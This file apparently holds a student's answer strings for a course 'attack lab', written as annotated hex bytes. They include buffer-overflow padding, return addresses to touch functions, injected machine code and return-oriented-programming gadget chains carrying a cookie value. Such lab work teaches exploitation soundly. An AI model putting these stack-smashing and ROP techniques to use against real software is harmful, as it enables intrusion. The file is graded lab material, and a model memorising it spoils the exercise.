/* Part1 level1 */
/* 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 aa 1f 40 00 00 00 00 00 */
/*               <--                       padding bits                      -->                                          |       &touch1          */


/* Part1 level2 */
/* 48 c7 c7 58 f5 6f 30 48 83 ec 18 c3 18 00 00 00 c3 00 00 00 00 00 00 00 de 1f 40 00 00 00 00 00 00 00 00 00 00 00 00 00 18 7c 63 55 00 00 00 00 */
/*               assembler code                      |       padding      |        &touch2        |         padding       |    &(assembler code)   */


/* Part1 level3 */
/* 48 c7 c7 48 7c 63 55 48 83 ec 18 c3 18 00 00 00 c3 00 00 00 00 00 00 00 03 21 40 00 00 00 00 00 00 00 00 00 00 00 00 00 18 7c 63 55 00 00 00 00 33 30 36 66 66 35 35 38 00 */
/*               assembler code                      |       padding      |        &touch3        |         padding       |    &(assembler code)  |         cookie            */


/* Part2 level2 */
/* 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 6c 22 40 00 00 00 00 00 58 f5 6f 30 00 00 00 00 4b 22 40 00 00 00 00 00 2e 1f 40 00 00 00 00 00 */
/*                <--                     padding bits                       -->                                          |       &(gadget1)      |         cookie        |       &(gadget2)      |       &(touch2)        */


/* Part2 level3 */
/* 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 94 23 40 00 00 00 00 00 4b 22 40 00 00 00 00 00 2b 22 40 00 00 00 00 00 48 00 00 00 00 00 00 00 21 23 40 00 00 00 00 00 0b 23 40 00 00 00 00 00 d4 22 40 00 00 00 00 00 7e 22 40 00 00 00 00 00 4b 22 40 00 00 00 00 00 53 20 40 00 00 00 00 00 33 30 36 66 66 35 35 38 00 */
/*                <--                     padding bits                       -->                                          |       &(gadget1)      |      &(gadget2)       |       &(gadget3)      |         offset        |       &(gadget4)      |       &(gadget5)      |       &(gadget6)      |       &(gadget7)      |       &(gadget8)      |       &(gadget9)      |          cookie         | */


/* Part3 level3 */
/* 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 94 23 40 00 00 00 00 00 4b 22 40 00 00 00 00 00 2b 22 40 00 00 00 00 00 48 00 00 00 00 00 00 00 21 23 40 00 00 00 00 00 0b 23 40 00 00 00 00 00 d4 22 40 00 00 00 00 00 7e 22 40 00 00 00 00 00 4b 22 40 00 00 00 00 00 53 20 40 00 00 00 00 00 33 30 36 66 66 35 35 38 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 00 00 00 00 01 00 00 */
/*                <--                     padding bits                       -->                                          <--                     padding bits                       -->                                   <--                     padding bits                       -->                                  <--                     padding bits                       -->                                                         |       &(gadget1)      |      &(gadget2)       |       &(gadget3)      |         offset        |       &(gadget4)      |       &(gadget5)      |       &(gadget6)      |       &(gadget7)      |       &(gadget8)      |       &(gadget9)      |          cookie          |                         padding bits                               |   len[0]  |   len[1]   */
